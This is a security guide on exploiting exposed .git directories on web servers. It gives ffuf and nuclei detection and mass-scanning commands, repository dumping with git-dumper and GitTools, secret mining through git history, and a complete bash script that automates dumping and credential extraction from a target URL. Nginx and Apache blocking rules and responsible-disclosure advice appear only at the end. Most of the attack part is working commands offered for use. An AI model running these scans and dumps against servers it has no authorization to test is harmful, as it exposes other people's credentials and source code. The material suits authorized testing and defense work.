# Hacking Exposed .git Directories: 2025 Security Research Guide

## Executive Summary
An exposed `.git` directory represents a critical security vulnerability that extends beyond source code exposure. 
It provides access to the complete project history, including accidentally committed secrets, deleted code, private branches, configuration files, and developer comments that were never meant to be public.

---

## Phase 1: Detection & Enumeration

### Understanding the Attack Surface

A `403 Forbidden` on `/.git/` doesn't indicate protection—it only means directory listing is disabled. The actual vulnerability exists when individual `.git` files remain accessible via direct requests.

### Modern Detection Tooling

**Primary Tools:**
- `ffuf` - Fast web fuzzer with excellent performance
- `feroxbuster` - Recursive scanner with smart filtering
- `nuclei` - Template-based vulnerability scanner

### Detection Wordlist

Create `git-files.txt`:
```text
.git/HEAD
.git/config
.git/index
.git/description
.git/logs/HEAD
.git/logs/refs/heads/master
.git/logs/refs/heads/main
.git/refs/heads/master
.git/refs/heads/main
.git/packed-refs
.git/objects/info/packs
```

### Detection Commands

**Single Target Scan:**
```bash
ffuf -u https://target.com/FUZZ -w git-files.txt -mc 200,403 -fc 404 -t 50
```

**Mass Scanning:**
```bash
# Scan multiple hosts from a file
ffuf -u https://FUZZHOST/FUZZFILE -w hosts.txt:FUZZHOST -w git-files.txt:FUZZFILE -mc 200 -t 100
```

**Using Nuclei (Recommended for scale):**
```bash
# Uses built-in template
nuclei -u https://target.com -t exposures/configs/git-config.yaml

# Mass scan
nuclei -l targets.txt -t exposures/configs/ -severity critical,high
```

---

## Phase 2: Repository Reconstruction

### Tool Selection Guide

| Tool | Best For | Speed | Reliability |
|------|----------|-------|-------------|
| git-dumper | General use, modern sites | Fast | Excellent |
| GitTools | Legacy sites, custom configs | Medium | Very Good |
| dvcs-ripper | Complex scenarios | Slow | Good |

### Primary: git-dumper (Python)

**Installation:**
```bash
pip3 install git-dumper
```

**Basic Usage:**
```bash
git-dumper https://target.com/.git/ ./output/target
```

**Advanced Options:**
```bash
# With custom threads and timeout
git-dumper https://target.com/.git/ ./output/target -j 10 --timeout 30

# Resume interrupted dump
git-dumper https://target.com/.git/ ./output/target --resume
```

### Alternative: GitTools Suite

**Installation:**
```bash
git clone https://github.com/internetwache/GitTools.git
cd GitTools
```

**Dumper Usage:**
```bash
./Dumper/gitdumper.sh https://target.com/.git/ ./output/target
```

**Extractor (Critical Step):**
```bash
# Extracts ALL commits, including deleted content
./Extractor/extractor.sh ./output/target ./extracted/target
```

This creates separate directories for each commit, invaluable for finding deleted secrets.

### Repository Restoration

```bash
cd ./output/target

# Restore working directory
git checkout -- .

# Or checkout specific branch
git checkout main  # or master, develop, etc.

# Verify repository integrity
git fsck --full
```

---

## Phase 3: Intelligence Gathering & Secret Mining

### 1. Automated Secret Scanning

**gitleaks (Industry Standard):**
```bash
# Install
brew install gitleaks  # macOS
# or
go install github.com/gitleaks/gitleaks/v8@latest

# Scan with verbose output
gitleaks detect --source . -v --report-format json --report-path findings.json

# Scan specific branch
gitleaks detect --source . -v --ref refs/heads/develop
```

**TruffleHog (High entropy detection):**
```bash
pip3 install truffleHog

# Scan entire history
trufflehog git file://. --json --only-verified > secrets.json

# Deep entropy scanning
trufflehog git file://. --entropy=True --regex
```

### 2. Historical Analysis

**Finding Committed-Then-Deleted Secrets:**
```bash
# Search all commits for patterns
git log -p --all --full-history -S "password" --source

# Search for specific file types that often contain secrets
git log -p --all --full-history -- "*.env" "*.config" "*.key" "*.pem"

# Find commits that modified sensitive files
git log --all --full-history --diff-filter=D -- "*.key" "*.pem" "*.env"
```

**Examining Commit Messages:**
```bash
# Search commit messages
git log --all --grep="password\|secret\|key\|token\|credential" -i

# Show commits with author info
git log --all --pretty=format:"%h - %an, %ar : %s" --grep="fix\|remove\|delete" -i
```

### 3. Advanced History Techniques

**The Reflog (Finding "Hidden" Commits):**
```bash
# Show all HEAD movements
git reflog show --all

# Examine a specific orphaned commit
git show <commit-hash>

# Checkout an orphaned commit
git checkout <commit-hash>
```

**Exploring All Branches:**
```bash
# List all branches (including remote)
git branch -a

# Checkout each branch to examine
git checkout origin/develop
git checkout origin/staging
git checkout origin/feature/payment-integration

# Show differences between branches
git diff main..develop
```

**Finding Large Files (Potential data dumps):**
```bash
# Find largest files in history
git rev-list --objects --all | \
  git cat-file --batch-check='%(objecttype) %(objectname) %(objectsize) %(rest)' | \
  sed -n 's/^blob //p' | \
  sort --numeric-sort --key=2 | \
  tail -10
```

### 4. Configuration Mining

**Examine git config:**
```bash
# View all configuration
git config --list

# Look for interesting remotes
cat .git/config

# Check for submodules (may expose other repos)
cat .gitmodules
```

**Check Git Hooks:**
```bash
# Hooks may contain deployment scripts with credentials
ls -la .git/hooks/
cat .git/hooks/pre-push
cat .git/hooks/post-receive
```

---

## Phase 4: Advanced Reconnaissance

### Author & Developer Analysis

```bash
# List all contributors
git log --format='%aN <%aE>' | sort -u

# Find most active contributors
git shortlog -sn --all

# Track specific developer's commits
git log --author="john.doe" --all -p
```

### Timeline Analysis

```bash
# Commits by date
git log --all --since="2024-01-01" --until="2024-12-31" --oneline

# Recent activity (last 30 days)
git log --all --since="30 days ago" --pretty=format:"%h %an %ad %s" --date=short

# Find commits around a specific date (potential incident response)
git log --all --since="2024-06-01" --until="2024-06-07" -p
```

### Stash Analysis (Often Overlooked)

```bash
# List all stashed changes
git stash list

# Examine stashed content
git stash show -p stash@{0}

# Apply and inspect each stash
for i in $(git stash list | cut -d: -f1); do
  echo "=== $i ==="
  git stash show -p $i
done
```

---

## Phase 5: Modern Automation & Scaling

### Complete Automation Script

```bash
#!/bin/bash
# automated-git-audit.sh

TARGET=$1
OUTPUT_DIR="./audit_$(date +%Y%m%d_%H%M%S)"

echo "[+] Starting automated .git audit for $TARGET"

# Phase 1: Dump repository
echo "[+] Dumping repository..."
git-dumper $TARGET/.git/ $OUTPUT_DIR/repo

# Phase 2: Restore
cd $OUTPUT_DIR/repo
git checkout -- . 2>/dev/null

# Phase 3: Secret scanning
echo "[+] Running secret scans..."
gitleaks detect --source . -v --report-format json --report-path ../gitleaks.json
trufflehog git file://. --json > ../trufflehog.json

# Phase 4: Historical analysis
echo "[+] Analyzing history..."
git log -p --all --full-history > ../full_history.txt
git reflog show --all > ../reflog.txt
git branch -a > ../branches.txt

# Phase 5: Generate report
echo "[+] Generating report..."
cat > ../REPORT.md <<EOF
# Git Audit Report
Target: $TARGET
Date: $(date)

## Statistics
- Total Commits: $(git rev-list --all --count)
- Total Branches: $(git branch -a | wc -l)
- Contributors: $(git log --format='%aN' | sort -u | wc -l)

## Files
- gitleaks.json: Automated secret detection
- trufflehog.json: Entropy-based secret detection
- full_history.txt: Complete commit history with diffs
- reflog.txt: Reference log (orphaned commits)
- branches.txt: All branches

## Next Steps
1. Review JSON reports for high-confidence secrets
2. Examine full_history.txt for sensitive patterns
3. Check reflog.txt for deleted/hidden commits
EOF

echo "[+] Audit complete. Results in $OUTPUT_DIR"
```

**Usage:**
```bash
chmod +x automated-git-audit.sh
./automated-git-audit.sh https://target.com
```

---

## Defense & Remediation

### For Security Teams

**Immediate Actions:**
1. Remove `.git` directory from web root
2. Rotate ALL credentials in repository history
3. Add web server rules:

**Nginx:**
```nginx
location ~ /\.git {
    deny all;
    return 404;
}
```

**Apache:**
```apache
<DirectoryMatch "^/.*/\.git/">
    Order deny,allow
    Deny from all
</DirectoryMatch>
```

### For Developers

**Prevent Secrets in Commits:**
```bash
# Pre-commit hook to scan for secrets
# .git/hooks/pre-commit

#!/bin/bash
gitleaks protect --staged --verbose
if [ $? -ne 0 ]; then
    echo "Warning: Possible secrets detected!"
    exit 1
fi
```

**Clean History (Nuclear Option):**
```bash
# Use BFG Repo-Cleaner for large repos
bfg --delete-files "*.env"
bfg --replace-text passwords.txt

# Or git-filter-repo (modern alternative)
git filter-repo --path-glob '*.env' --invert-paths
```

---

## Quick Reference Cheat Sheet

```bash
# Detection
ffuf -u https://target.com/FUZZ -w git-files.txt -mc 200

# Dumping
git-dumper https://target.com/.git/ ./output

# Restoration
cd output && git checkout -- .

# Secret Scanning
gitleaks detect --source . -v
trufflehog git file://. --json

# History Analysis
git log -p --all -S "password"
git reflog show --all
git branch -a

# Find large/deleted files
git log --diff-filter=D --summary | grep delete
git rev-list --objects --all | git cat-file --batch-check='%(objecttype) %(objectname) %(objectsize)' | awk '$1=="blob"' | sort -k3nr | head -20

# Timeline
git log --all --since="2024-01-01" --oneline

# Contributors
git shortlog -sn --all
```

---

## Responsible Disclosure

When discovering exposed `.git` directories:
1. Document findings professionally
2. Report to security@target.com or via bug bounty
3. Provide clear reproduction steps
4. Give reasonable time for remediation (90 days standard)
5. Do not publicly disclose active vulnerabilities

---

**Tools Repository:**
- git-dumper: https://github.com/arthaud/git-dumper
- GitTools: https://github.com/internetwache/GitTools
- gitleaks: https://github.com/gitleaks/gitleaks
- TruffleHog: https://github.com/trufflesecurity/trufflehog
- nuclei: https://github.com/projectdiscovery/nuclei
